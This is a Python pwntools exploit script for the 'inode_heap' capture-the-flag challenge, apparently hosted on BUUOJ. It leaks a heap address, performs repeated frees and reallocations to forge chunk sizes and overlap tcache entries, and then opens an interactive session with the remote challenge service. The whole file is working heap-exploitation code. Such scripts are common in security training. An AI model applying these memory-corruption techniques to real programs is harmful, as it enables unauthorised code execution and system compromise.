from pwn import *


def input_int(p, num):
    p.sendlineafter('> ', '1')
    p.sendlineafter('>', '1')
    p.sendlineafter('your inode number:', str(num))

def input_short(p, num):
    p.sendlineafter('> ', '1')
    p.sendlineafter('>', '2')
    p.sendlineafter('your inode number:', str(num))

def remove_int(p):
    p.sendlineafter('> ', '2')
    p.sendlineafter('>', '1')

def remove_short(p):
    p.sendlineafter('> ', '2')
    p.sendlineafter('>', '2')

def show_int(p):
    p.sendlineafter('> ', '3')
    p.sendlineafter('>', '1')

def show_short(p):
    p.sendlineafter('> ', '3')
    p.sendlineafter('>', '2')


def pwn():
    DEBUG = 0

    if DEBUG == 1:
        p = process('./inode_heap')
        context.terminal = ['tmux', 'split', '-h']
        context.log_level = 'debug'
    else:
        p = remote('node3.buuoj.cn',28394)
        context.log_level = 'debug'

    libc = ELF('../../x64libc/libc.so.6')
    input_int(p, 0)
    remove_int(p)
    input_short(p, 0)
    remove_int(p)
    input_short(p, 0)
    input_short(p, 0)
    input_short(p, 0)

    show_int(p)
    p.recvuntil('your int type inode number :')
    recv = p.recvuntil('\n',drop=True)
    heap_addr = int(recv)
    if heap_addr < 0x100000000:
        heap_addr = 0x100000000 + heap_addr
    input_int(p, heap_addr + 0x80)
    input_int(p, 0)
    input_int(p, 0x91)

    
    input_int(p, 0)
    input_int(p, 0)
    input_int(p, 0x21)

    for i in range(7):
        remove_short(p)
        input_int(p, 0)
    remove_short(p)
    show_short(p)

    p.recvuntil('your short type inode number :')
    recv = int(p.recvuntil('\n'))
    if recv < 0:
        recv = 0x10000 + recv

    input_short(p, recv - 0x2a0 + 112 - 8)
    input_short(p, 0x0)
    input_short(p, 0x0)
    
    input_short(p, 0x0)
    input_short(p, 0x0)
    remove_short(p)
    input_int(p, 0)
    remove_short(p)
    input_short(p, (heap_addr & 0xffff) + (0x2f0-0x260))
    input_short(p, 0x0)
    input_short(p, 0x0)
    p.sendlineafter('> ', '1')
    p.sendlineafter('>', '2')
    p.sendlineafter('your inode number:', '666')
    
    print hex(heap_addr)
    print hex(recv)
    if DEBUG == 1:
        gdb.attach(p)

    p.interactive()


if __name__ == '__main__':
    pwn()